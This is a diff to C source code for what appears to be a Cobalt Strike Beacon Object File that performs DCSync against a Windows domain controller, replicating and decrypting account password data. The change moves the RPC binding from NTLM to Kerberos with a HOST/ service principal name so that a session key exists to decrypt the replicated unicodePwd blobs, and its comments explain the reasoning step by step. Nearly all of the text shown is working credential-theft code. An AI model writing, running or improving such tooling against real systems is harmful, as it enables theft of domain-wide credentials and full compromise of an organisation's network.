@@ -1349,36 +1349,59 @@ void go(char *args, int args_len)
         qos.IdentityTracking  = MY_RPC_C_QOS_IDENTITY_STATIC;
         qos.ImpersonationType = MY_RPC_C_IMP_LEVEL_IMPERSONATE;
 
-        /* Authn service on ncalrpc:
-         *   NEGOTIATE (9) is rejected as UNKNOWN_AUTHN_SERVICE — SPNEGO
-         *     is a network-auth wrapper with nothing to negotiate over
-         *     ALPC, so the runtime does not register it on this transport.
-         *   WINNT (10 = NTLMSSP) is the always-registered local auth
-         *     service on ncalrpc — it's a fast-path that piggybacks the
-         *     ALPC-delivered process token rather than doing a real
-         *     challenge-response, so no network I/O and no loopback-
-         *     reflection issue.
-         *   KERBEROS (16) is also usually registered on domain-joined
-         *     boxes but requires an SPN, and NULL SPN is ambiguous here.
+        /* Authn service on ncalrpc — order matters:
          *
-         * If WINNT itself is disabled by policy on this DC, we'll get
-         * 0x6D3 again and fall back to unauthenticated (relies on lsass
-         * calling RpcImpersonateClient, which pulls the caller token
-         * from the ALPC header even with no SSPI context). */
-        BeaconPrintf(CALLBACK_OUTPUT, "[.] trace: RpcBindingSetAuthInfoExA (WINNT + IMPERSONATE)\n");
-        rpcSt = RPCRT4$RpcBindingSetAuthInfoExA(hRpc, NULL,
-            RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_AUTHN_WINNT,
+         *   KERBEROS (16) is what we NEED, not just what works. Kerberos
+         *     goes through full SSPI: AcquireCredentialsHandle picks the
+         *     caller's TGT from LSA, InitializeSecurityContext talks to
+         *     the local KDC, and the runtime attaches a real security
+         *     context to the binding with a queryable session key —
+         *     without which we cannot derive the RC4 key that decrypts
+         *     the replicated unicodePwd blob (I_RpcBindingInqSecurityContext
+         *     returns RPC_S_INVALID_BINDING = 0x6A6 if there is no
+         *     context to inquire from). SPN = the DC's HOST/<fqdn> or,
+         *     equivalently, the fqdn alone which SSPI treats as HOST/.
+         *
+         *   WINNT (10 = NTLMSSP) works over ncalrpc as an ALPC fast-
+         *     path that piggybacks the caller token WITHOUT materializing
+         *     an SSPI context. Fine for calls that only need auth, but
+         *     gives us no session key — DCSync decryption fails.
+         *
+         *   NEGOTIATE (9) is refused on ncalrpc (0x6D3) — SPNEGO has
+         *     nothing to negotiate over ALPC. */
+        char spn[256];
+        DWORD spnLen = 0;
+        {
+            const char *host_prefix = "HOST/";
+            DWORD prefLen = 5;
+            DWORD dcLen = 0;
+            while (aDC[dcLen] && dcLen < 250) dcLen++;
+            MSVCRT$memcpy(spn, host_prefix, prefLen);
+            MSVCRT$memcpy(spn + prefLen, aDC, dcLen);
+            spn[prefLen + dcLen] = 0;
+            spnLen = prefLen + dcLen;
+        }
+
+        BeaconPrintf(CALLBACK_OUTPUT,
+            "[.] trace: RpcBindingSetAuthInfoExA (KERBEROS + IMPERSONATE, spn=%s)\n", spn);
+        rpcSt = RPCRT4$RpcBindingSetAuthInfoExA(hRpc, (RPC_CSTR)spn,
+            RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_AUTHN_GSS_KERBEROS,
             NULL, 0, &qos);
         BeaconPrintf(CALLBACK_OUTPUT, "[.] trace:   rpcSt=0x%08x\n", rpcSt);
 
         if (rpcSt == 1747 /* RPC_S_UNKNOWN_AUTHN_SERVICE */) {
-            /* WINNT also refused — try the no-auth path. On ncalrpc
-             * the ALPC layer still delivers the caller token, so lsass
-             * can access-check via RpcImpersonateClient. */
+            /* Kerberos not registered on ncalrpc on this build — fall
+             * back to WINNT. DRSBind will still succeed but the later
+             * decrypt step will fail because there is no session key.
+             * The caller will see the error at that point. */
             BeaconPrintf(CALLBACK_OUTPUT,
-                "[.] trace: fallback — no RPC-level auth (rely on ALPC token)\n");
-            rpcSt = 0;
+                "[.] trace: KERBEROS not registered — falling back to WINNT (decrypt will fail)\n");
+            rpcSt = RPCRT4$RpcBindingSetAuthInfoExA(hRpc, NULL,
+                RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_AUTHN_WINNT,
+                NULL, 0, &qos);
+            BeaconPrintf(CALLBACK_OUTPUT, "[.] trace:   rpcSt=0x%08x\n", rpcSt);
         }
+        (void)spnLen;
     }
     if (rpcSt) {
         BeaconPrintf(CALLBACK_ERROR,
